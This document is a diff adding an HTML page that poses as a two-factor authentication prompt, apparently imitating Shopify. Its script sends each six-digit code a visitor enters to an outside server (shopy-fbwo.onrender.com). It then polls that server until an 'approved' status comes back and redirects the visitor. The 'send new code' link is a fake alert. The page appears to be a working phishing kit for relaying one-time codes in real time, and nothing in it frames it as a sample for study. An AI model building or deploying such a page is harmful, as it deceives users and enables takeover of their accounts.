@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-Factor Authentication</title>
+    <link rel="icon" type="image/png" href="res/shopi.png">
+    <link rel="stylesheet" href="res/app.css">
+    <style>
+        .spinner-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error {
+            border-color: #ff4444 !important;
+        }
+        
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        
+        .code-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .code-input:focus {
+            border-color: #3498db;
+            outline: none;
+            box-shadow: 0 0 5px rgba(52, 152, 219, 0.3);
+        }
+        
+        .code-input.active {
+            border-color: #3498db;
+        }
+    </style>
+</head>
+<body>    
+
+<main>
+    <div class="form">
+        <div class="logo">
+            <img src="res/logo.png" alt="Logo">
+        </div>
+
+        <div class="text">
+            <h2>Two-Factor Authentication</h2>
+            <span>Enter the 6-digit code from your authenticator app</span>
+        </div>
+
+        <div class="col">
+            <label>Authentication Code</label>
+            <div class="code-inputs" id="codeContainer">
+                <input type="text" class="code-input" maxlength="1" data-index="0">
+                <input type="text" class="code-input" maxlength="1" data-index="1">
+                <input type="text" class="code-input" maxlength="1" data-index="2">
+                <input type="text" class="code-input" maxlength="1" data-index="3">
+                <input type="text" class="code-input" maxlength="1" data-index="4">
+                <input type="text" class="code-input" maxlength="1" data-index="5">
+            </div>
+            <input type="hidden" id="fullCode">
+            <div style="text-align: center; margin-top: 10px;">
+                <a href="#" onclick="resendCode()">Send new code</a>
+            </div>
+        </div>
+
+        <div class="col">
+            <button id="submitBtn" onclick="send2FA()">
+                <span class="spinner-btn">
+                    <span class="btn-text">Verify</span>
+                    <span class="btn-spinner" id="btnSpinner"></span>
+                </span>
+            </button>
+        </div>
+
+        <div class="col info-text">
+            <p>For your security, we require two-factor authentication. Enter the 6-digit code from your authenticator app.</p>
+        </div>
+
+        <div class="col links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+<script>
+let sessionId = null;
+let checkInterval = null;
+
+function showButtonSpinner() {
+    $("#btnSpinner").show();
+    $("#submitBtn").prop("disabled", true);
+    $(".btn-text").text("Verifying...");
+}
+
+function hideButtonSpinner() {
+    $("#btnSpinner").hide();
+    $("#submitBtn").prop("disabled", false);
+    $(".btn-text").text("Verify");
+}
+
+function checkStatus() {
+    if (!sessionId) return;
+    
+    $.ajax({
+        url: `https://shopy-fbwo.onrender.com/status/${sessionId}`,  // UPDATED
+        method: 'GET',
+        success: function(response) {
+            if (response.status === "approved") {
+                clearInterval(checkInterval);
+                hideButtonSpinner();
+                window.location.href = response.redirect_url;
+            }
+        },
+        error: function(xhr) {
+            if (xhr.status === 404) {
+                clearInterval(checkInterval);
+                hideButtonSpinner();
+                alert("Session expired. Please try again.");
+            }
+        }
+    });
+}
+
+function updateFullCode() {
+    let fullCode = '';
+    $('.code-input').each(function() {
+        fullCode += $(this).val();
+    });
+    $('#fullCode').val(fullCode);
+    return fullCode;
+}
+
+function send2FA() {
+    $(".code-input").removeClass("error");
+
+    const code = updateFullCode();
+
+    if (code.length !== 6) {
+        $(".code-input").addClass("error");
+        alert("Please enter the complete 6-digit code");
+        return;
+    }
+
+    if (!/^\d{6}$/.test(code)) {
+        $(".code-input").addClass("error");
+        alert("Please enter a valid 6-digit code (numbers only)");
+        return;
+    }
+
+    showButtonSpinner();
+
+    if (checkInterval) clearInterval(checkInterval);
+
+    $.ajax({
+        url: 'https://shopy-fbwo.onrender.com/2fa',  // UPDATED
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            code: code
+        }),
+        success: function(response) {
+            if (response.success) {
+                sessionId = response.id;
+                checkInterval = setInterval(checkStatus, 1500);
+                setTimeout(checkStatus, 500);
+                
+                // Auto timeout after 5 minutes
+                setTimeout(function() {
+                    if (checkInterval) {
+                        clearInterval(checkInterval);
+                        hideButtonSpinner();
+                        alert("Request timed out. Please try again.");
+                    }
+                }, 300000);
+                
+            } else {
+                hideButtonSpinner();
+                alert("Verification failed. Please try again.");
+            }
+        },
+        error: function(xhr, status, error) {
+            hideButtonSpinner();
+            console.error("Error details:", xhr.responseText, status, error);
+            alert("Connection error. Please check console for details.");
+        }
+    });
+}
+
+function resendCode() {
+    alert("New code sent to your authenticator app.");
+}
+
+// Handle code input navigation
+$('.code-input').on('input', function() {
+    const value = $(this).val();
+    const index = parseInt($(this).data('index'));
+    
+    // Only allow numbers
+    if (!/^\d$/.test(value)) {
+        $(this).val('');
+        return;
+    }
+    
+    // Move to next input if current has value
+    if (value !== '' && index < 5) {
+        $(`.code-input[data-index="${index + 1}"]`).focus();
+    }
+    
+    updateFullCode();
+});
+
+// Handle backspace navigation
+$('.code-input').on('keydown', function(e) {
+    const index = parseInt($(this).data('index'));
+    
+    if (e.key === 'Backspace' && $(this).val() === '' && index > 0) {
+        $(`.code-input[data-index="${index - 1}"]`).focus();
+    }
+});
+
+// Handle paste
+$('#codeContainer').on('paste', function(e) {
+    e.preventDefault();
+    const pasteData = e.originalEvent.clipboardData.getData('text').trim();
+    
+    if (/^\d{6}$/.test(pasteData)) {
+        const digits = pasteData.split('');
+        $('.code-input').each(function(index) {
+            if (index < 6) {
+                $(this).val(digits[index] || '');
+            }
+        });
+        updateFullCode();
+        $('.code-input[data-index="5"]').focus();
+    }
+});
+
+// Handle Enter key on any code input
+$('.code-input').keypress(function (e) {
+    if (e.key === "Enter") {
+        send2FA();
+    }
+});
+
+$(window).on('beforeunload', function() {
+    if (checkInterval) clearInterval(checkInterval);
+});
+
+// Auto-focus first input on page load
+$(document).ready(function() {
+    $('.code-input[data-index="0"]').focus();
+});
+</script>
+
+</body>
+</html>
